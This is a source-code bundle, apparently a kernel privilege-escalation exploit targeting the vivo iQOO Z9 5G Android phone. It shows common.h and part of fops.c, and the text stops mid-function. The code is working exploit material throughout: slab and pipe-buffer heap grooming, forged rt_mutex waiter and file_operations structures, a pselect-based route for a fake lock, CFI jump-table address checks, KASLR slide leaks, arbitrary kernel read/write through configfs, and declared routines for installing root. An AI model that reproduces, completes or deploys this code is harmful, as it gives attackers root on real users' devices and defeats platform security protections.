# iQOO Z9 5G (vivo) Payload Source Code Bundle

Source Directory: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src`

## Table of Contents

- [common.h](#common-h)
- [fops.c](#fops-c)
- [kernelsnitch/futex_hash.h](#kernelsnitch-futex_hash-h)
- [kernelsnitch/kernelsnitch.h](#kernelsnitch-kernelsnitch-h)
- [kernelsnitch/timeutils.h](#kernelsnitch-timeutils-h)
- [kernelsnitch/utils.h](#kernelsnitch-utils-h)
- [main.c](#main-c)
- [offset.h](#offset-h)
- [pipe.c](#pipe-c)
- [preload.c](#preload-c)
- [root.c](#root-c)
- [slide.c](#slide-c)
- [slide_app.c](#slide_app-c)
- [su_daemon.c](#su_daemon-c)
- [targets/iqoo-z9-5g/p0_fingerprint.h](#targets-iqoo-z9-5g-p0_fingerprint-h)
- [targets/iqoo-z9-5g/target.h](#targets-iqoo-z9-5g-target-h)
- [util.c](#util-c)

---

## common.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/common.h`

```c
#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE

#include "offset.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#endif
#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#endif
#else
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#endif
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA (-0xe80LL)
#endif

#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x500
#endif
#ifndef MM_ORDER
#define MM_ORDER 3
#endif
#ifndef KERNELSNITCH_VERBOSE
#define KERNELSNITCH_VERBOSE 0
#endif
#ifndef KERNELSNITCH_MTE_ENABLED
#define KERNELSNITCH_MTE_ENABLED 0
#endif
#define MM_PARTIALS 5
#define CORE 0
#ifndef KSNITCH_COLLISIONS
#define KSNITCH_COLLISIONS 4
#endif

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define PIPE_CANDIDATE_PAGES 8
#ifndef SKB_SEND_SIZE
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#endif
#ifndef SKB_RECLAIM_SENDS
#define SKB_RECLAIM_SENDS 4
#endif
#ifndef APP_SLIDE_RECLAIM_SENDS
#define APP_SLIDE_RECLAIM_SENDS 16
#endif
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#ifndef FAKE_WAITER_PRIO
#define FAKE_WAITER_PRIO 130
#endif
#ifndef SLIDE_FAKE_WAITER_PRIO
#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
#endif
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL

#define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
#define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
#define KMALLOC_NORMAL_TYPE 0
#ifndef KMALLOC_CGROUP_TYPE
#define KMALLOC_CGROUP_TYPE 2
#endif
#define KMALLOC_PIPE_INDEX 11
#ifndef KMALLOC_CACHE_TYPES
#define KMALLOC_CACHE_TYPES 4
#endif
#define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
#define KMALLOC_CACHE_SLOT(type, index) \
  (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
#define KMALLOC_CGROUP_PIPE_SLOT \
  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
#define KMALLOC_PIPE_OBJ_SIZE 0x800

#define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
#define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)

#define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
#define PIPE_SCAN_CHUNK 0x400
#define PIPE_OBJS_PER_SLAB 16
#define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
#define PIPE_DRAIN_SLABS 15
#define PIPE_RECLAIM_SLABS 15
#define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
#define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
#ifndef PIPE_MAX_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PIPE_MAX_ATTEMPTS 1
#else
#define PIPE_MAX_ATTEMPTS 12
#endif
#endif

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define CONSUMER_CORE (CORE + 1)
#define CONSUMER_MAX_CALLS 1
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#ifndef PSELECT_ENTER_DELAY_USEC
#define PSELECT_ENTER_DELAY_USEC 50000
#endif
#ifndef SLIDE_WAITER_WAKE_STATE
#define SLIDE_WAITER_WAKE_STATE 3
#endif
#ifndef SLIDE_LOCK_OWNER_VALUE
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#endif
#ifndef LEGACY_RT_MUTEX_WAITER
#define LEGACY_RT_MUTEX_WAITER 0
#endif
#ifndef COMPACT_RT_MUTEX_WAITER
#define COMPACT_RT_MUTEX_WAITER 0
#endif
#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
#error "select only one rt_mutex_waiter layout"
#endif
#ifndef FAKE_WAITER_LAYOUT_SIZE
#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
#endif
#define PSELECT_TIMEOUT_SEC 1
#ifndef ROUTE_WAIT_SECONDS
#define ROUTE_WAIT_SECONDS 8
#endif
#define SLIDE_NFULNL_LOGGER_NAME \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
#define SLIDE_NFULNL_LOGGER_OBJECT \
  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
#ifndef SLIDE_WAITER_TREE_LEFT
#define SLIDE_WAITER_TREE_LEFT SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
#endif
#define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
#ifndef SLIDE_WAITER_TASK
#define SLIDE_WAITER_TASK SLIDE_INIT_TASK
#endif
#define SLIDE_ROOT_TASK_GROUP \
  P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

struct kernelsnitch_shared_state;

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct user_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

extern pid_t pipe_prepare_child;
extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern uintptr_t binwrite_target;

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;
#endif
extern atomic_int cfi_stage_done;
extern atomic_int pipe_prepare_request;
extern atomic_int pipe_prepare_done;
extern ssize_t cfi_write_ret;
extern ssize_t cfi_read_ret;
extern ssize_t cfi_read_slot_ret;
extern ssize_t cfi_owner_ret;
extern ssize_t cfi_restore_ret;
extern uint64_t fops_before;
extern uint64_t fops_after;
extern int root_child_done;
extern char ashmem_path[256];
extern uint32_t root_uid_before;
extern uint32_t root_uid_after;
extern int cfi_attempts;
extern int pipe_stage_attempts;
extern int cfi_dirty_seen;
extern int cfi_last_step;
extern int cfi_last_errno;
extern uint64_t kmalloc_pipe_cache;
extern uint64_t kmalloc_normal_1k_cache;
extern uint64_t kmalloc_normal_2k_cache;
extern uint64_t kmalloc_cgroup_1k_cache;
extern uint64_t kmalloc_cgroup_2k_cache;
extern uint64_t candidate_slab_cache;
extern int pipe_cache_gate_ok;
extern int pipe_cache_page_index;
extern int pipe_cache_slot_hit;
extern uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
extern uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
extern uintptr_t pipebuf_page_base;
extern uintptr_t pipebuf_addr;
extern int pipebuf_pipe_idx;
extern char physrw_readback[64];
extern char physrw_after_write[64];
extern int physrw_read_ok;
extern int physrw_write_ok;
extern int pipe_scan_vmemmap;
extern int pipe_scan_ops;
extern int pipe_scan_len;
extern int pipe_probe_found;
extern uint64_t pipe_probe_page;
extern uint64_t pipe_probe_ops;
extern uint64_t pipe_probe_private;
extern uint32_t pipe_probe_len;
extern uint32_t pipe_probe_flags;
extern uint64_t pipe_scan_first_page;
extern uint64_t pipe_scan_first_ops;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
extern int p0_virtual_base_probe;
#endif
extern uint64_t pipe_scan_q0;
extern uint64_t pipe_scan_q1;
extern uint64_t pipe_scan_q2;
extern uint64_t pipe_scan_q3;
extern uint32_t pipe_scan_first_len;
extern uint32_t pipe_scan_first_flags;
extern uint64_t physrw_read64_before;
extern uint64_t physrw_read64_after;
extern uint64_t physrw_write64_value;
extern int physrw_read64_ok;
extern int physrw_write64_ok;
extern int kaslr_done;
extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern uint64_t slide_bootid_before;
extern uint64_t slide_bootid_after;
extern uint64_t slide_bootid_want;
extern ssize_t slide_bootid_restore_ret;
extern uintptr_t slide_p0_offset;
extern uintptr_t slide_oracle_parent;
extern uintptr_t slide_oracle_target;
extern uintptr_t p0_gate_page_struct;
extern uintptr_t p0_probe_page_struct;
extern uintptr_t fops_data_probe_addr;
extern int fops_data_probe_active;
extern int data_alias_uses_slide;
extern int data_addr_canonical;
extern int slide_p0_session_fresh;
extern int memfd_leak;

int run_exploit(int argc, char **argv);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void disable_rseq_for_thread(void);
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
int try_cache_ashmem_path(const char *path);
int same_rdev_path(const char *path, dev_t rdev);
void init_ashmem_path(void);
int open_ashmem_device(void);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t p0_alias_image_offset(uintptr_t data_alias);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t data_direct_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t slide_canon_addr(uintptr_t data_alias);
uintptr_t canon_addr(uintptr_t image_addr);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
void put_fake_fops_table(unsigned char *p, size_t off);
int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len);
int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos);
int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
int reclaim_receiver_fd(void);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
    !defined(SLIDE_STACK_WRITER)
void fdset_put_word(fd_set *set, int word, uint64_t value);
#endif
#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);
#endif

int slide_leak_kernel_base(void);
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
int slide_sigreturn_preflight(void);
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD
void app_publish_p0_offset(uintptr_t offset);
void app_publish_slide_ready(void);
void app_publish_p0_dirty(void);
void app_publish_writer_started(void);
int select_slide_payload_slot(uintptr_t offset);
int select_slide_payload_index(size_t index);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
int app_trigger_fops_slide_route(void);
#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
int app_trigger_fops_oracle_slot(size_t slot);
#endif
#endif
#endif

ssize_t configfs_write_once(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
int is_direct_ptr(uintptr_t value);
uint64_t kernel_read64(int fd, uintptr_t target);
ssize_t kernel_write_data(
    int fd, uintptr_t target, const void *data, size_t len);
ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
int repair_fake_fops_llseek(int fd);
int restore_slide_boot_id(int fd);
int install_child_root(int fd);
int try_cfi_stage(void);



void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                     uintptr_t tree_parent, uintptr_t tree_right,
                     uintptr_t tree_left, uintptr_t pi_parent,
                     uintptr_t pi_right, uintptr_t pi_left,
                     uintptr_t task, uintptr_t lock,
                     uint32_t priority);


void init_ctx(struct mm_ctx *ctx, size_t cnt);
void resize_pipe_slots(int pipefd[2], size_t slots);
void make_pipe_object(int pipefd[2]);
void alloc_pipe_object(int pipefd[2]);
void free_pipe_object(int pipefd[2]);
uintptr_t prepare_pipe_buffer_page_child(void);
uintptr_t prepare_pipe_buffer_page(void);
void reset_pipe_attempt(void);
uintptr_t direct_to_page(uintptr_t addr);
uintptr_t direct_to_head_page(int fd, uintptr_t addr);
uintptr_t page_to_direct(uintptr_t page);
uintptr_t pipe_buf_ops_addr(void);
int pipe_cache_matches(uint64_t slab_cache);
int pipe_reclaim_cache_gate(int fd);
int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
int find_pipe_buffer(int fd, uintptr_t base);
int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len);
int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len);
#if !defined(APP_EXACT_PIPE_BUFFER_ONLY) || !APP_EXACT_PIPE_BUFFER_ONLY
void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write);
#endif
int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len);
int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
int install_pipe_physrw(int fd);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
int prepare_p0_pipe_oracle(void);
int expand_p0_pipe_oracle(void);
int verify_p0_pipe_oracle_gate(void);
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
uintptr_t scan_p0_pipe_oracle(void);
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void);
#endif
int restore_p0_oracle_pages(int fd);
int run_p0_pipe_oracle_diagnostic(int fd);
#endif

int install_android_root(int fd);

#endif

```

---

## fops.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/fops.c`

```c
#include "common.h"

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif
#endif

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int one_page_span(uintptr_t start, size_t len) {
  if (!len || start > UINTPTR_MAX - (len - 1)) {
    return 0;
  }
  return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
}

static int audit_fake_fops_table(int fd) {
  enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
  _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
  uint64_t table[span / sizeof(uint64_t)];
  if (!one_page_span(fake_fops, sizeof(table))) {
    pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n",
               fake_fops, sizeof(table));
    return 0;
  }
  ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
  if (rd != (ssize_t)sizeof(table)) {
    pr_warning("cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
               rd, fake_fops, sizeof(table), errno);
    return 0;
  }
  struct expected_slot {
    size_t off;
    uint64_t value;
  } expected[] = {
    {FOPS_OWNER_OFF, 0},
    {FOPS_LLSEEK_OFF, data_addr(ASHMEM_MISC_FOPS)},
    {FOPS_READ_OFF, 0},
    {FOPS_WRITE_OFF, 0},
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER_CFI_JT)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER_CFI_JT)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL_CFI_JT)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL_CFI_JT)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP_CFI_JT)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN_CFI_JT)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE_CFI_JT)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ_CFI_JT)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO_CFI_JT)},
  };
  pr_info("cfi fake fops span=%016zx-%016zx owner=%016llx llseek=%016llx read=%016llx write=%016llx\n",
          fake_fops, fake_fops + sizeof(table) - 1,
          (unsigned long long)table[FOPS_OWNER_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_LLSEEK_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_READ_OFF / sizeof(uint64_t)],
          (unsigned long long)table[FOPS_WRITE_OFF / sizeof(uint64_t)]);
  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
    uint64_t got = table[expected[i].off / sizeof(uint64_t)];
    if (got != expected[i].value) {
      pr_warning("cfi fake fops slot mismatch off=0x%zx got=%016llx want=%016llx\n",
                 expected[i].off, (unsigned long long)got,
                 (unsigned long long)expected[i].value);
      return 0;
    }
  }
  return 1;
}

static int fake_fops_owner_is_zero(int fd) {
  uint64_t owner = UINT64_MAX;
  ssize_t rd = configfs_read_once(
      fd, fake_fops + FOPS_OWNER_OFF, &owner, sizeof(owner));
  cfi_owner_ret = rd;
  if (rd != (ssize_t)sizeof(owner) || owner != 0) {
    pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
               rd, (unsigned long long)owner, errno);
    return 0;
  }
  return 1;
}

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
    !defined(SLIDE_STACK_WRITER)
void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    for (int grace = 0;
         grace < 200 && atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) == 0;
         grace++) {
      usleep(10000);
    }
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}
#endif

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK_CFI_JT);
  uint64_t before = 0;
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  if (!one_page_span(slot, sizeof(llseek))) {
    errno = ERANGE;
    return 0;
  }
  ssize_t before_rd = configfs_read_once(
      fd, slot, &before, sizeof(before));
  if (before_rd != (ssize_t)sizeof(before)) {
    return 0;
  }
  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
          (unsigned long long)before, (unsigned long long)llseek, slot);
  if (before == llseek) {
    return 1;
  }
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  int write_errno = errno;
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  int read_errno = errno;
  pr_info("cfi llseek repair wr=%zd rd=%zd after=%016llx want=%016llx "
          "write_errno=%d read_errno=%d\n",
          wr, rd, (unsigned long long)after, (unsigned long long)llseek,
          write_errno, read_errno);
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr = data_addr_canonical
      ? kaslr_base + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF
      : SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
